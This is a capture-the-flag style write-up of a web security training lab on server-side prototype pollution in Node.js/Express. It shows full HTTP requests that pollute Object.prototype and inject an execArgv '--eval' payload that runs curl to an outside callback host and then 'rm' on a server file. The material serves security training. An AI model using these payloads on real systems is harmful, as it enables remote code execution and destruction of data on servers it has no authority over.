## Remote code execution via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter

Hint :

The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site.

Note :

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Notes

- /admin
- Maintenance jobs
- Billing and Delivery form

## Resume

1. Log in as `wiener:peter`.
2. Send the address form once and capture `POST /my-account/change-address`.
3. Confirm pollution with a harmless `json spaces` property.
4. Use `execArgv` to inject a Node.js `--eval` payload.
5. Verify code execution with a Collaborator interaction.
6. Replace the proof-of-execution command with the file-deletion command.
7. Run maintenance jobs again to delete `carlos`'s morale file.

## Solve

Submit the billing/delivery address form and inspect the JSON request in the proxy history. The important observation is that the backend accepts JSON and reflects a user-shaped JSON object in the response, which means the request body is being merged into a server-side object.

first probe is:

```http
POST /my-account/change-address HTTP/2
Host: 0a1900ad04c105a7805cfd4600730051.web-security-academy.net
Cookie: session=fJ7e4NVcQlObYQdmpXdJqHGxKT5Lnt0r
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"fJ7e4NVcQlObYQdmpXdJqHGxKT5Lnt0r",
  "__proto__": {
    "json spaces": 10
  }
}
```

When you resend this and view the raw response, the indentation increases. That confirms prototype pollution, because the response serializer is now inheriting the `json spaces` property from the polluted prototype.

The admin panel contains a maintenance jobs button, and that is the likely place where the application spawns background Node.js processes. That makes `execArgv` the right thing to target, because if a child process is started with inherited process arguments, adding `--eval` can force code execution inside that process.

Use this payload to test code execution with Burp Collaborator:

```http
POST /my-account/change-address HTTP/2
Host: 0a1900ad04c105a7805cfd4600730051.web-security-academy.net
Cookie: session=fJ7e4NVcQlObYQdmpXdJqHGxKT5Lnt0r
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"fJ7e4NVcQlObYQdmpXdJqHGxKT5Lnt0r",
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('curl https://9blrakzastdzeejpfogcm4nqxh38r3fs.oastify.com')"
    ]
  }
}
```

Then go to the admin panel and trigger the maintenance jobs again. If the jobs fail and you see interactions on the Collaborator server, the payload worked and you have confirmed RCE.

Once the proof-of-execution works, replace the network callback with the file deletion command:

```http
POST /my-account/change-address HTTP/2
Host: 0a1900ad04c105a7805cfd4600730051.web-security-academy.net
Cookie: session=fJ7e4NVcQlObYQdmpXdJqHGxKT5Lnt0r
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"fJ7e4NVcQlObYQdmpXdJqHGxKT5Lnt0r",
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
  }
}
```

After sending the polluted request, go back to the admin panel and run the maintenance jobs again. The child process will inherit the malicious `execArgv`, execute the `rm` command, delete Carlos’s morale file, and solve the lab.